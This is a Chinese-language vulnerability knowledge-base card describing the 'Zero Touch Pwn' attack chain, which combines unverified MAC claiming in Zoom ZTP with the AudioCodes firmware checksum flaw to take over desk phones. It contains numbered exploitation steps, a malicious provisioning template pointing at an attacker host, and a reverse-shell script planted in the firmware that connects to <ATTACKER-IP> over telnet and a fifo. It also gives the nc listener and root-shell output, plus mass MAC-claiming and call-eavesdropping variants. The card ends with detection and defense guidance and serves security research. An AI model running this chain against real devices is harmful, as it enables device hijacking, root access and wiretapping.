---
id: iot-zoom-ztp-mac-claim-malicious-firmware-takeover
title: Zoom ZTP 零接触配置未验证设备所有权：认领任意 MAC 下发恶意模板与固件，配合 AudioCodes 校验和缺陷远程接管桌面电话
type: scenario
domain: iot
path: iot
technique: zoom-ztp-unverified-ownership-malicious-provisioning-firmware
aliases:
- Zero Touch Pwn
- Zoom ZTP 接管桌面电话
- AudioCodes 零接触配置攻击
- SYSS-2022-056
- ZTP MAC 认领劫持
tags:
- iot
- voip
- zoom
- audiocodes
- ztp
- provisioning
- firmware
- supply-chain
- cve-2023-22955
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: AudioCodes C450HD UC 3.4.6.604.1（原文测试设备）；Zoom ZTP 关键漏洞由厂商 2023-08-17 告知已修复（SYSS-2022-055 除外，原文）
verification:
  verified_by: verifier-V516
  verified_at: '2026-11-11T11:43:38+08:00'
  notes: 已对照原文全文与32张截图核对：ZTP工作流、双向TLS+UA校验(AUDC/3.4.6.604)、Add Device仅填MAC无所有权证明(SYSS-2022-056)、恶意模板 provisioning/firmware/url=https://ptma.sy.gs/pbx/AudioCodes_UCC450HD_3.4.8.198.1.img（图05/06）、批量导入MAC(图07 256台)、反连脚本与nc -lvkp 5000、uid=0(admin)(图29)均与原文/截图一致；CVE-2023-22955为链中固件缺陷，本卡自身SYSS-2022-056无CVE，cve:[]成立。修复时间原文为2023-08-17厂商告知已修复(SYSS-2022-055除外)，已用set-versions精化措辞。测试版本UC 3.4.6.604.1见/etc/release截图(图28)。dedup/dup-scan无同链候选。置信点：RTSP监听通话为原文截图实证(图31/32)。
---

## 一句话结论

Zoom Phone 的零接触配置（ZTP）在「添加设备」时只凭 MAC 地址、不验证设备真实归属，任何持有 Zoom Phone 许可的攻击者都能认领任意厂商 MAC 并给它挂上自定义配置模板；设备恢复出厂后按模板从攻击者服务器下载配置与固件，而 AudioCodes 固件更新只校验简单校验和（CVE-2023-22955），攻击者改固件、重算校验和即可被设备接受，启动后以 root 连接攻击者，从而远程接管桌面电话、窃听通话。

## 原理

- Zoom ZTP 工作流：管理员在 Zoom Phone 添加设备并分配配置模板 → 厂商重定向服务（如 `redirect.audiocodes.com`）被通知该设备归 Zoom 管 → 出厂设备向厂商重定向服务请求配置 → 302 到 Zoom ZTP（`https://eu01pbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/<MAC>.cfg`）→ 设备带客户端证书请求 → ZTP 返回配置模板内容。
- 设备认证侧看起来是强的：双向 TLS，客户端证书 CN/序列号需与设备 MAC 匹配，还校验 User-Agent（`AUDC/3.4.6.604 AUDC-IPPhone-C450HD_UC_3.4.6.604/1`），错误 UA 返回 404。但这只防止别人**读取**配置。
- 真正的缺陷在「设备归属认领」：Zoom Phone 管理界面添加设备只需填 MAC（`Display Name`、`MAC Address`、`Device Type`、`Provision Template`），没有一次一密（OTP）、发票/序列号或其他能证明 MAC 属于本组织的校验（CWE-283 Unverified Ownership，SYSS-2022-056）。持有 Zoom Phone 许可的攻击者可把任意 MAC 加进自己的账户；既不影响合法所有者的后续分配，也不会覆盖攻击者先前的分配。
- 配置模板本身可写 `provisioning/firmware/url=` 等键，等于由攻击者控制设备的配置与固件下载地址；界面还支持导入 MAC 列表批量认领，原文未发现可添加设备数量限制，因此可批量覆盖整个厂商 MAC 段。
- 设备在出厂状态（新设备或被重置）时会信任 Zoom ZTP 的响应；配置模板把固件 URL 指向攻击者服务器后，设备下载固件并交给 `flasher` 升级。
- 固件侧缺不可变可信根（CVE-2023-22955）：镜像只按「从偏移 0x60 起的字节和」做校验和，没有签名。修改 `rootfs.ext4`、重算校验和后设备照常接受（不重算时屏幕报 `CRC Error / Upgrade Failed`）。
- 恶意固件中把脚本路径加进 `/home/ipphone/rcS`，设备重启即执行；脚本用 busybox 自带工具建 fifo 反连 `/bin/sh`，攻击者拿到 root shell（原文 `id` 回显 `uid=0(admin) gid=0(root)`）。之后可启动 RTSP 流窃听通话、以设备为跳板进内网或组僵尸网络。
- 修复状态：厂商 2023-08-17 告知除 SYSS-2022-055（固件缺失不可变可信根）外的关键漏洞已修复，因此该远程链在修复后失效，但固件信任问题仍在（原文声明）。

## 触发条件

- 攻击者持有可用的 Zoom Phone 许可/账户（能进入 Phone System Management 添加设备）。
- 知道目标桌面电话的 MAC（可扫描厂商 MAC 段或从内网/资产信息获取）。
- 目标设备为受影响型号/固件，且会经历出厂配置流程（新机或恢复出厂设置）；设备能访问厂商重定向服务与 Zoom ZTP。
- 固件缺少签名校验（CVE-2023-22955 未修复的版本），攻击者能提供 HTTP 固件镜像。
- 原文环境为 AudioCodes C450HD UC 3.4.6.604.1；修复后的 Zoom ZTP 已不适用该链。

## 利用步骤

1. 准备恶意固件：拆开官方镜像，挂载 `rootfs.ext4`，在 `/home/ipphone/scripts/` 放入反连脚本并把路径追加到 `/home/ipphone/rcS`，重新打包并重算各 section 校验和（详见固件校验和卡）。
2. 把恶意固件放在攻击者 HTTP 服务器上（原文用 `https://ptma.sy.gs/pbx/AudioCodes_UCC450HD_3.4.8.198.1.img` 形式）。
3. 在 Zoom Phone 管理界面新建配置模板，写入：
   `provisioning/firmware/url=https://attacker.example/AudioCodes_UCC450HD_3.4.8.198.1.img`
4. 在 Zoom Phone「Add Device」填目标 MAC、选择 AudioCodes c450hd 和恶意模板并保存；或导入包含大量 MAC 的列表批量认领。
5. 让目标设备恢复出厂/重启进入配置流程；设备经厂商重定向到 Zoom ZTP，取回恶意模板并访问攻击者固件 URL。
6. 设备安装恶意固件并重启，反连脚本执行；攻击者 `nc -lvkp 5000` 收到 root shell。
7. 进一步操作：启动设备 RTSP 流监听通话、读取配置与凭据、以内网位置横向。

## PoC

配置模板（原文截图内容）：

```ini
provisioning/firmware/url=https://attacker.example/AudioCodes_UCC450HD_3.4.8.198.1.img
provisioning/period/type=weekly
provisioning/period/weekly/time=00:00
provisioning/random_provisioning_time=300
```

固件内反连脚本（加入 `/home/ipphone/scripts` 并写入 `/home/ipphone/rcS`）：

```sh
#!/bin/sh
/bin/sleep 120
TF=$(/bin/mktemp -u)
/usr/bin/mkfifo $TF
/usr/bin/telnet <ATTACKER-IP> 5000 0<$TF | /bin/sh 1>$TF
```

攻击端：

```
nc -lvkp 5000
# 设备回连后
id    # uid=0(admin) gid=0(root) groups=0(root)
```

## 变体与关联

- 变体：不刷固件也能利用受控配置模板改 SIP 服务器/凭据、开启调试或改管理口令，实现通话劫持与凭据收集（原文重点演示的是固件路径）。
- 变体：批量导入 MAC 列表可把一个厂商 MAC 段的设备都挂到攻击者账户，原文未发现数量限制，具备僵尸网络规模。
- 关联：[[code-analysis-reverse-firmware-audiocodes-checksum-firmware-patch]]（CVE-2023-22955，固件仅校验和、可改包重算）。
- 关联：[[code-analysis-reverse-firmware-audiocodes-hardcoded-des3-password-decrypt]]（CVE-2023-22957，配置内加密口令可解密）与配置文件加密卡（CVE-2023-22956）。
- 关联：[[iot-hardware-spi-firmware-crc16-patch-aes-key-extract]]（另一类「固件完整性只用 CRC/校验和」的硬件案例）。

## 检测与防御

- 防御：ZTP 设备认领必须做所有权证明（一次性码、订单/序列号绑定、人工审批），不能只信 MAC；批量导入需强校验与配额。
- 防御：设备侧固件必须验证厂商签名与不可变可信根（secure boot/TPM），不能只校验校验和；配置模板的固件 URL 限定厂商域名并签名。
- 检测：Zoom 管理员审计中关注异常批量 Add Device/导入 MAC、指向非厂商域名的 `provisioning/firmware/url`；设备侧监控向非厂商固件服务器发起的下载与启动后异常外连（telnet/fifo 反连特征）。
- 检测：网络侧监控出厂设备配置流量被重定向到非官方 ZTP/固件地址；固件升级后 `/home/ipphone/rcS`/`scripts` 目录出现非常规文件。
